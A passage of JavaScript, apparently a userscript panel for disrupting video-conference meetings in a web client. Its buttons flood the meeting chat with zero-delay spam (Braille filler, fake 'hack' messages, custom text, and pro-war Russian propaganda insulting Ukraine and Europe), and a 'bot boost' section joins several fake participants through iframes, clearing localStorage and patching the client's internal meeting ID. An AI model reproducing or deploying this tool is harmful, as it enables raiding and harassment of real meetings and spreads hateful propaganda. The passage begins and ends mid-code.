▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖",
            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿",
            "𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙𝅙",
        ];

        window.jokeSpamInterval = setInterval(() => {
            c(jokeTexts[Math.floor(Math.random() * jokeTexts.length)]);
        }, 0);
    }
}), (function stopJokeSpam() {
    if (window.jokeSpamInterval) {
        clearInterval(window.jokeSpamInterval);
        window.jokeSpamInterval = null;
    }
})),

// Матрица спам
e.addButton(N, "ФЛАГИ СПАМ", !0, (function startMatrixSpam() {
    if (!window.matrixSpamInterval) {
        const matrixTexts = [
            "ЗЕЛЕНСКИЙ ХОТЕЛ НА МОСКВУ😏😏😂 ВОТ ТЕБЕ🖕 ХА🤙🤙🤙🤣🤣🤣🤣🤣🤣🇷🇺🇷🇺🇷🇺🇷🇺🇷🇺РОССИЯ МАТУШКА🇷🇺🇷🇺ГНИЛАЯ ГЕЙВРОПА СКОРО ПОМРЕТ🇷🇺🇷🇺🇷🇺НАШ РУССКИЙ ДУХ НЕ СЛОМИТЬ💪💪УКРАИНА БУДЕТ НАША🇷🇺🇷🇺🇷🇺🤙Za вождя 🙏🙏❤❤НАШ Слава Богу 🙏❤СЛАВА РОССИИ 🙏❤АНГЕЛА ХРАНИТЕЛЯ КАЖДОМУ ИЗ ВАС 🙏❤БОЖЕ ХРАНИ РОССИЮ 🙏❤СПАСИБО ВАМ НАШИ МАЛЬЧИКИ 🙏🏼❤🇷🇺🙏❤️БОЖЕ ХРАНИ Z🙏❤️СПАСИБО VАМ НАШИ СВО🙏🏼❤️🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШ НАРОД СлаVа Богу Z🙏❤️АНГЕЛА ХРАНИТЕЛЯ КАЖДОМУ ИЗ ВАССлаVа Богу Z🙏❤️СVАВА Z🙏❤️АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤️ЗЕЛЕНСКИЙ ХОТЕЛ НА МОСКВУ😏😏😂 ВОТ ТЕБЕ🖕 ХА🤙🤙🤙🤣🤣🤣🤣🤣🤣🇷🇺🇷🇺🇷🇺🇷🇺🇷🇺РОССИЯ МАТУШКА🇷🇺🇷🇺ГНИЛАЯ ГЕЙВРОПА СКОРО ПОМРЕТ🇷🇺🇷🇺🇷🇺НАШ РУССКИЙ ДУХ НЕ СЛОМИТЬ💪💪УКРАИНА БУДЕТ НАША🇷🇺🇷🇺🇷🇺🤙Za вождя 🙏🙏❤❤НАШ Слава Богу 🙏❤СЛАВА РОССИИ 🙏❤АНГЕЛА ХРАНИТЕЛЯ КАЖДОМУ ИЗ ВАС 🙏❤БОЖЕ ХРАНИ РОССИЮ 🙏❤СПАСИБО ВАМ НАШИ МАЛЬЧИКИ 🙏🏼❤🇷🇺🙏❤️БОЖЕ ХРАНИ Z🙏❤️СПАСИБО VАМ НАШИ СВО🙏🏼❤️🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШ НАРОД СлаVа Богу Z🙏❤️АНГЕЛА ХРАНИТЕЛЯ КАЖДОМУ ИЗ ВАССлаVа Богу Z🙏❤️СVАВА Z🙏❤️АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤️ЗЕЛЕНСКИЙ ХОТЕЛ НА МОСКВУ😏😏😂 ВОТ ТЕБЕ🖕 ХА🤙🤙🤙🤣🤣🤣🤣🤣🤣🇷🇺🇷🇺🇷🇺🇷🇺🇷🇺РОССИЯ МАТУШКА🇷🇺🇷🇺ГНИЛАЯ ГЕЙВРОПА СКОРО ПОМРЕТ🇷🇺🇷🇺🇷🇺НАШ РУССКИЙ ДУХ🇷🇺",
            "Слава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤БОЖЕ ХРАНИ Z🙏❤СПАСИБО ВАМ НАШИ СВО🙏🏼❤🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШИМ БОЙЦАМСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤БОЖЕ ХРАНИ Z🙏❤СПАСИБО ВАМ НАШИ СВО🙏🏼❤🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШИМ БОЙЦАМСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤БОЖЕ ХРАНИ Z🙏❤СПАСИБО ВАМ НАШИ СВО🙏🏼❤🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШИМ БОЙЦАМСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤БОЖЕ ХРАНИ Z🙏❤СПАСИБО ВАМ НАШИ СВО🙏🏼❤🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШИМ БОЙЦАМСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤БОЖЕ ХРАНИ Z🙏❤СПАСИБО ВАМ НАШИ СВО🙏🏼❤🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШИМ БОЙЦАМСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУСлава Богу Z🙏❤СЛАВА Z🙏❤АНГЕЛА ХРАНИТЕЛЯ Z КАЖДОМУ ИЗ ВАС🙏❤БОЖЕ ХРАНИ Z🙏❤СПАСИБО ВАМ НАШИ СВО🙏🏼❤🇷🇺 ХРАНИ ZOV✊🇷🇺💯СПАСИБО НАШИМ БОЙЦАМСлава Богу🇷🇺",
            "MATRIX.LOADING... 🌐 COMPLETE",
            "HACK.COMPLETE 🔓 ACCESS GRANTED",
            "CODE.INJECTED 📟 VIRUS SPREAD",
            "SYSTEM.OVERRIDE 🔧 SUCCESSFUL",
            "FIREWALL.BREACH 🔥 DETECTED",
            "ACCESS.GRANTED ✅ WELCOME",
            "NEURAL.NETWORK 🧠 ACTIVATED",
            "CYBER.ATTACK 🎯 LAUNCHED"
        ];

        window.matrixSpamInterval = setInterval(() => {
            c(matrixTexts[Math.floor(Math.random() * matrixTexts.length)]);
        }, 0);
    }
}), (function stopMatrixSpam() {
    if (window.matrixSpamInterval) {
        clearInterval(window.matrixSpamInterval);
        window.matrixSpamInterval = null;
    }
})),
// Кастомный спам
e.addButton(N, "✏️ СВОЙ ТЕКСТ СПАМ", !0, (function startCustomSpam() {
    if (!window.customSpamInterval) {
        // Удаляем существующие окна, если они есть
        const existingPrompts = document.querySelectorAll('[data-prompt-type="spam-settings"]');
        existingPrompts.forEach(prompt => prompt.remove());

        const promptDiv = document.createElement('div');
        promptDiv.setAttribute('data-prompt-type', 'spam-settings');
        promptDiv.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
            width: 450px;
            background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
            backdrop-filter: blur(20px);
            color: #fff;
            padding: 35px;
            border-radius: 24px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                       0 0 100px rgba(82, 0, 255, 0.05),
                       inset 0 0 0 1px rgba(255,255,255,0.1);
            z-index: 999999;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            opacity: 0;
            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        `;

        // Заголовок
        const title = document.createElement('h2');
        title.textContent = 'Настройка спама';
        title.style.cssText = `
            margin: 0 0 25px 0;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            background: linear-gradient(135deg, #22C55E, #16A34A);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        `;

        // Поле ввода текста
        const input = document.createElement('input');
        input.placeholder = 'Введите текст для спама';
        input.style.cssText = `
            width: 100%;
            padding: 12px;
            background: rgba(255,255,255,0.05);
            border: 2px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: white;
            font-size: 15px;
            margin-bottom: 20px;
            outline: none;
            transition: all 0.3s ease;
            box-sizing: border-box;
        `;

        input.onfocus = () => {
            input.style.border = '2px solid rgba(34, 197, 94, 0.5)';
            input.style.boxShadow = '0 0 0 4px rgba(34, 197, 94, 0.1)';
        };

        input.onblur = () => {
            input.style.border = '2px solid rgba(255,255,255,0.1)';
            input.style.boxShadow = 'none';
        };

        // Контейнер для кнопок
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        `;

        // Функция обновления состояния кнопок
        const updateButtonsState = (input, infiniteButton, countButton) => {
            const isEmpty = !input.value.trim();
            
            if (isEmpty) {
                infiniteButton.style.opacity = '0.5';
                countButton.style.opacity = '0.5';
                infiniteButton.style.cursor = 'not-allowed';
                countButton.style.cursor = 'not-allowed';
                infiniteButton.disabled = true;
                countButton.disabled = true;
            } else {
                infiniteButton.style.opacity = '1';
                countButton.style.opacity = '1';
                infiniteButton.style.cursor = 'pointer';
                countButton.style.cursor = 'pointer';
                infiniteButton.disabled = false;
                countButton.disabled = false;
            }
        };

        // Функция создания кнопки
        const createButton = (text, color, hoverColor, isOutline = false) => {
            const button = document.createElement('button');
            button.textContent = text;
            button.style.cssText = `
                padding: 12px 24px;
                background: ${isOutline ? 'transparent' : color};
                color: ${isOutline ? color : '#fff'};
                border: ${isOutline ? `2px solid ${color}` : 'none'};
                border-radius: 12px;
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.3s ease;
                min-width: 130px;
                backdrop-filter: blur(10px);
                font-family: inherit;
            `;

            button.onmouseover = () => {
                if (!button.disabled) {
                    button.style.transform = 'translateY(-2px)';
                    button.style.background = hoverColor;
                    if (isOutline) {
                        button.style.color = '#fff';
                    }
                    button.style.boxShadow = `0 10px 20px rgba(${color.match(/\d+/g)?.[0]}, ${color.match(/\d+/g)?.[1]}, ${color.match(/\d+/g)?.[2]}, 0.3)`;
                }
            };

            button.onmouseout = () => {
                if (!button.disabled) {
                    button.style.transform = 'translateY(0)';
                    button.style.background = isOutline ? 'transparent' : color;
                    if (isOutline) {
                        button.style.color = color;
                    }
                    button.style.boxShadow = 'none';
                }
            };

            return button;
        };

        // Функция создания второго окна для указания количества
        const showCountPrompt = (text) => {
            const countDiv = document.createElement('div');
            countDiv.setAttribute('data-prompt-type', 'spam-settings');
            countDiv.style.cssText = promptDiv.style.cssText;
            
            const countTitle = document.createElement('h2');
            countTitle.textContent = 'Укажите количество';
            countTitle.style.cssText = title.style.cssText;

            const countInput = document.createElement('input');
            countInput.type = 'number';
            countInput.min = '1';
            countInput.max = '100';
            countInput.placeholder = 'Введите количество (1-100)';
            countInput.style.cssText = input.style.cssText;

            const countButtonContainer = document.createElement('div');
            countButtonContainer.style.cssText = buttonContainer.style.cssText;

            const startButton = createButton("Начать", "rgb(34, 197, 94)", "rgb(22, 163, 74)");
            const backButton = createButton("Назад", "rgb(239, 68, 68)", "rgb(220, 38, 38)", true);

            startButton.onclick = () => {
                const count = parseInt(countInput.value) || 10;
                const safeCount = Math.min(Math.max(count, 1), 100);
                
                let spamCount = 0;
                window.customSpamInterval = setInterval(() => {
                    if (spamCount < safeCount) {
                        c(text);
                        spamCount++;
                    } else {
                        clearInterval(window.customSpamInterval);
                        window.customSpamInterval = null;
                    }
                }, 0);
                countDiv.remove();
            };

            backButton.onclick = () => {
                countDiv.style.opacity = '0';
                countDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(-15deg)';
                setTimeout(() => {
                    countDiv.remove();
                    startCustomSpam(); // Открываем заново окно настроек
                }, 600);
            };

            countButtonContainer.appendChild(startButton);
            countButtonContainer.appendChild(backButton);
            countDiv.appendChild(countTitle);
            countDiv.appendChild(countInput);
            countDiv.appendChild(countButtonContainer);
            document.body.appendChild(countDiv);

            requestAnimationFrame(() => {
                countDiv.style.opacity = '1';
                countDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0)';
            });
        };

        // Кнопки
        const infiniteButton = createButton("Бесконечный", "rgb(34, 197, 94)", "rgb(22, 163, 74)");
        const countButton = createButton("Указать количество", "rgb(34, 197, 94)", "rgb(22, 163, 74)", true);
        const cancelButton = createButton("Отмена", "rgb(239, 68, 68)", "rgb(220, 38, 38)", true);

        // Инициализация состояния кнопок
        updateButtonsState(input, infiniteButton, countButton);

        // Слушатель ввода для обновления состояния кнопок
        input.addEventListener('input', () => {
            updateButtonsState(input, infiniteButton, countButton);
        });

        // Функция закрытия окна
        const closePrompt = () => {
            promptDiv.style.opacity = '0';
            promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(-15deg)';
            setTimeout(() => promptDiv.remove(), 600);
        };

        // Обработчики кнопок
        infiniteButton.onclick = () => {
            if (!input.value.trim()) return;
            const text = input.value.trim();
            window.customSpamInterval = setInterval(() => {
                c(text);
            }, 0);
            closePrompt();
        };

        countButton.onclick = () => {
            if (!input.value.trim()) return;
            const text = input.value.trim();
            closePrompt();
            showCountPrompt(text);
        };

        cancelButton.onclick = closePrompt;

        // Собираем окно
        buttonContainer.appendChild(infiniteButton);
        buttonContainer.appendChild(countButton);
        buttonContainer.appendChild(cancelButton);
        promptDiv.appendChild(title);
        promptDiv.appendChild(input);
        promptDiv.appendChild(buttonContainer);
        document.body.appendChild(promptDiv);

        // Анимация появления
        requestAnimationFrame(() => {
            promptDiv.style.opacity = '1';
            promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0)';
        });
    }
}), (function stopCustomSpam() {
    if (window.customSpamInterval) {
        clearInterval(window.customSpamInterval);
        window.customSpamInterval = null;
    }
})),
    e.addSeparator(N),
    e.addSubtitle(N, "НАКРУТКА БОТОВ"),

    // Оригинальная кнопка
    e.addButton(N, "🤖 ЗАПУСТИТЬ 5 БОТОВ", !1, function() {
        var t = 5;  // Фиксированное количество ботов
        var e = false;
        localStorage.clear();
        window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
        
        var n = window.open("about:blank", "Bot Panel - " + d);
        d++;
        n.document.title = "Панель управления ботами";
    
        n.document.head.innerHTML = `
            <style>
                body {
                    background: linear-gradient(45deg, #1a1a1a, #2d2d2d);
                    color: white;
                    font-family: 'Segoe UI', Arial, sans-serif;
                    padding: 30px;
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                }
                .container {
                    max-width: 800px;
                    text-align: center;
                }
                h1 {
                    font-size: 2.8rem;
                    background: linear-gradient(45deg, #00ff88, #00ffee);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    margin-bottom: 15px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
                }
                .status {
                    font-size: 1.4rem;
                    color: #888;
                    margin-bottom: 25px;
                }
                .info {
                    font-size: 1.1rem;
                    color: #666;
                    margin: 15px 0;
                }
                .progress {
                    width: 300px;
                    height: 8px;
                    background: rgba(255,255,255,0.1);
                    border-radius: 4px;
                    margin: 20px auto;
                    overflow: hidden;
                }
                .progress-bar {
                    width: 0%;
                    height: 100%;
                    background: linear-gradient(45deg, #00ff88, #00ffee);
                    transition: width 15s linear;
                }
                .bot-counter {
                    font-size: 1.2rem;
                    color: #00ff88;
                    margin-top: 20px;
                }
            </style>
        `;
    
        n.document.body.innerHTML = `
            <div class="container">
                <h1>Подключение ботов</h1>
                <div class="status">Идет подключение ботов к конференции...</div>
                <div class="progress">
                    <div class="progress-bar"></div>
                </div>
                <div class="bot-counter">Количество ботов: ${t}</div>
                <div class="info">Пожалуйста, не закрывайте это окно во время работы ботов</div>
            </div>
        `;
    
        setTimeout(() => {
            const progressBar = n.document.querySelector('.progress-bar');
            progressBar.style.width = '100%';
            
            setTimeout(() => {
                n.document.querySelector('.status').innerHTML = 'Боты успешно подключены!';
                n.document.querySelector('.status').style.color = '#00ff88';
                n.document.querySelector('.info').innerHTML = 'Можете свернуть это окно';
            }, 15000);
        }, 100);
    
        var a = document.createElement("div");
        a.style.display = "flex";
        a.style.flexWrap = "wrap";
        a.style.justifyContent = "center";
        a.style.marginTop = "30px";
        n.document.body.appendChild(a);
    
        for (var i = 0; i < t; i++) {
            var l = document.createElement("iframe");
            l.src = meetingURL;
            if (e) {
                l.style.width = "0%";
                l.style.height = "0%";
                l.style.display = "none";
            } else {
                l.style.width = "700px";
                l.style.height = "900px";
                l.style.border = "none";
                l.style.borderRadius = "10px";
                l.style.margin = "10px";
                l.style.boxShadow = "0px 4px 8px rgba(0, 0, 0, 0.1)";
            }
            a.appendChild(l);
            var c = l.contentWindow;
            (c.webpackChunkwebclient = c.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
            }]);
        }
    
        for (var s = a.querySelectorAll("iframe"), u = 0; u < s.length; u++) {
            if (u % 5 == 0 && u !== 0) {
                var p = document.createElement("div");
                p.style.width = "100%";
                a.appendChild(p);
            }
        }
    }, function() {
        console.log("Button disabled!");
    }),
    
    // Кнопка для 10 ботов
    e.addButton(N, "🤖 ЗАПУСТИТЬ 10 БОТОВ", !1, function() {
        var t = 10;  // Фиксированное количество ботов
        var e = false;
        localStorage.clear();
        window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
        
        var n = window.open("about:blank", "Bot Panel - " + d);
        d++;
        n.document.title = "Панель управления ботами";
    
        // Тот же HTML и стили, что и выше...
        n.document.head.innerHTML = `
            <style>
                body {
